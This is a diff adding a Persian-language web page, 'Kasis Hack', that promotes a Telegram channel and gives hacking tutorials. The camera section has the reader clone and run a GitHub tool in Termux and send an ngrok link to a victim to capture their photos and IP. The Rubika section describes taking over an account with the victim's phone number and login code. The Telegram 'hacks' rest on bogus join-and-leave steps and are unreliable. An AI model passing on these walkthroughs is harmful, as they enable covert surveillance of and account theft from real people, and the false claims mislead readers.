@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>کاسِس هک</title>
+  <style>
+    * { box-sizing: border-box; font-family: Tahoma, sans-serif; }
+    body {
+      margin: 0;
+      padding: 16px;
+      background: #0d1117;
+      color: #f0f6fc;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #161b22;
+      padding: 14px;
+      border-radius: 14px;
+      border: 1px solid #30363d;
+      margin-bottom: 16px;
+    }
+    .header img {
+      width: 56px;
+      height: 56px;
+      border-radius: 12px;
+      object-fit: cover;
+      background: #21262d;
+    }
+    .header h1 {
+      margin: 0;
+      font-size: 20px;
+      color: #ff4d4d;
+    }
+    .menu-btn {
+      width: 100%;
+      text-align: right;
+      background: #161b22;
+      color: #f0f6fc;
+      border: 1px solid #30363d;
+      padding: 14px 16px;
+      border-radius: 12px;
+      font-size: 15px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .menu-btn:active { background: #21262d; }
+    .channel-btn {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background: #238636;
+      color: #fff;
+      text-decoration: none;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: bold;
+      margin-top: 6px;
+    }
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 14px;
+      padding: 16px;
+      white-space: pre-line;
+      line-height: 1.9;
+      font-size: 14px;
+    }
+    .sub-btn {
+      width: 100%;
+      background: #1f6feb;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 14px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .back-btn {
+      width: 100%;
+      background: #30363d;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 14px;
+      margin-top: 14px;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="icon.png" alt="لوگوی کاسِس هک" onerror="this.style.display='none'" />
+    <div>
+      <h1>کاسِس هک</h1>
+      <small style="color:#8b949e;">کانال رسمی: @hak_Cases</small>
+    </div>
+  </div>
+
+  <!-- صفحه اصلی -->
+  <div id="home">
+    <button class="menu-btn" onclick="openTgMenu()">هک چنل و گروه تلگرام</button>
+    <button class="menu-btn" onclick="showPage('هک گالری و دوربین گوشی', textCam)">هک گالری و دوربین گوشی</button>
+    <button class="menu-btn" onclick="showPage('هک اکانت روبیکا', textRubika)">هک اکانت روبیکا</button>
+    <button class="menu-btn" onclick="showPage('ساخت پروکسی تلگرام با ترموکس', textProxy)">ساخت پروکسی تلگرام با ترموکس</button>
+    <button class="menu-btn" onclick="showPage('آپدیت کردن برنامه ترموکس', textUpdate)">آپدیت کردن برنامه ترموکس</button>
+    <a class="channel-btn" href="https://t.me/hak_Cases" target="_blank">عضویت در کانال تلگرامی هک (@hak_Cases)</a>
+  </div>
+
+  <!-- زیرمنوی تلگرام -->
+  <div id="tg-menu" class="hidden">
+    <button class="sub-btn" onclick="showPage('آموزش هک چنل تلگرام', textChannel)">هک چنل</button>
+    <button class="sub-btn" onclick="showPage('آموزش هک گروه تلگرام', textGroup)">هک گروه تلگرام</button>
+    <button class="back-btn" onclick="goHome()">بازگشت به صفحه اصلی</button>
+  </div>
+
+  <!-- صفحه نمایش متن آموزش -->
+  <div id="detail" class="hidden">
+    <div id="detail-title" style="font-size:17px;font-weight:bold;margin-bottom:10px;color:#58a6ff;"></div>
+    <div id="detail-body" class="card"></div>
+    <button class="back-btn" onclick="goHome()">بازگشت به صفحه اصلی</button>
+  </div>
+
+  <script>
+    const textChannel = `اموزش هک چنل تلگرام😈
+کافیه یک چنل خصوصی بسازین و لینک چنلی که میخواید را هک کنید رو داخل چنل خودتون میزاریم و روی لینک کانال قربانی میزنی و میری داخلش و ۲۱ بار روی پروفایل میزنید و مییا  بیرون بعد داخل ۵ بار از کانال او بیاید بیرون و برید بیرون و در اخر باید لفت بدید و بعد از طریق لینکی که در چنل گذاشتین وارد چنلش میشین و میبینی سوپرایزز😈`;
+
+    const textGroup = `حالا اموزش هک گروه تلگرام👌
+
+کافیه عضو گروه بشین و هرطوری باشه ادمین بشید و ۲ بار از گروه لف میدین و دوباره میاین داخل گروه و با هر ۲بار لفت دادن  و عضو شدن در گروهش ۵ عضو از گروهش کم میشه و مثلا شما ۴ بار اینکار بکنین ۱۰ عضو کم میشه و اون نمیدونه کار کی هست و بعدا لفت هم بدین هنوز کار میکنه😈`;
+
+    const textCam = `خب دوستان برای این کار باید ترموکس رو از گوگل پلی نصب بکنید یا همون فروشگاه اگه تونستین در سایت اصلی ترموکس نصب نکنید توجه کنید از سایت های دیگه نصب نکنید چون هک میشین خب اگه نصب کردین کد ها را به ترتیب بزنید در ترموکس
+apt update
+apt upgrade
+pkg install wget php git openssl
+git clone https://github.com/HACKGM/cam
+cd cam
+bash cam.sh
+هرجایی هم سوال پرسید [n/y [کلمه Y رو بفرستید،
+اگه میخواید همه دستورات بالا رو باهمدیگه وارد کنید n رو بزنید 
+
+خب حالا باید تا مرحله نصب رسیده باشید ،
+کافیه گزینه ۲ رو بفرستید که با ngrok پورت فراوردینگ انجام بشه و لینکی که باید به قربانی بدید
+واستون ارسال بشه،
+
+اگه در مواقعی پیش اومد که لینک نداد دوباره تست کنید و چک کنید نقطه اتصال همراه روشن باشه و
+فیلترشکنتون خاموش باشه :)
+اگه قربانی دسترسی به دوربین رو نده عکسش براتون ارسال نمیشه و فقط ای پیش میاد،
+وقتی عکس قربانی ارسال شد براتون و میخواید سیوش کنید ابتدا دکمه CTRL رو بزنید و بعدش کلمه C
+رو بزنید تا به مرحله دریافت اطلاعات قربانی پایان داده بشه ،
+سپس دستور ls
+رو بزنید تا وارد پوشه عکس ها بشید بعدشم دستور
+mv *png /sdcard
+رو بزنید تا عکسا توی حافظه داخلی گوشیتون سیو بشن`;
+
+    const textRubika = `خب دوستان برای این اموزش هم باید ترموکس رو نصب کنید و حتما از گوگل پلی یا سایت خودش نه در سایت های دیگه چون هک میشین خب اگه نصب کردین این کد هارا به ترتیب بزنید در ترموکس 
+pkg install git
+
+pkg install python
+
+git clone
+https://github.com/mazyar17/hack
+
+-rubika.git
+
+cd hack-rubika
+
+Is
+
+python hack-rubika.py
+
+حالا شماره قربانی را وارد کنید و کد را دریافت کنین و تمام هک میشه`;
+
+    const textProxy = ` خب دوستان این کد هارا به ترتیب در ترموکس بزنید
+
+ apt update 
+
+apk install tor
+
+tor
+بعد خودکار پروکسی روی تلگرام و گوشی شما ساخته میشه و به مرورگر تور وصل میشه
+پروکسی تلگرام را این بنویسید : ۱۲۷.٠.٠.۱
+و پورت را این : ۹٠۵٠
+و تمام شد و این کار در نت ملی هم جواب میده`;
+
+    const textUpdate = ` خب دوستان کافیه این کد هارا به ترتیب در ترموکس بزنید 
+شروع
+apt update
+ apt upgrade
+ pkg install git
+ pkg install python
+ pkg install ruby
+ pkg install perl$
+pkg install nodejs
+پایان
+و ترموکس شما اپدید میشه`;
+
+    function hideAll() {
+      document.getElementById('home').classList.add('hidden');
+      document.getElementById('tg-menu').classList.add('hidden');
+      document.getElementById('detail').classList.add('hidden');
+    }
+
+    function goHome() {
+      hideAll();
+      document.getElementById('home').classList.remove('hidden');
+    }
+
+    function openTgMenu() {
+      hideAll();
+      document.getElementById('tg-menu').classList.remove('hidden');
+    }
+
+    function showPage(title, body) {
+      hideAll();
+      document.getElementById('detail-title').innerText = title;
+      document.getElementById('detail-body').innerText = body;
+      document.getElementById('detail').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
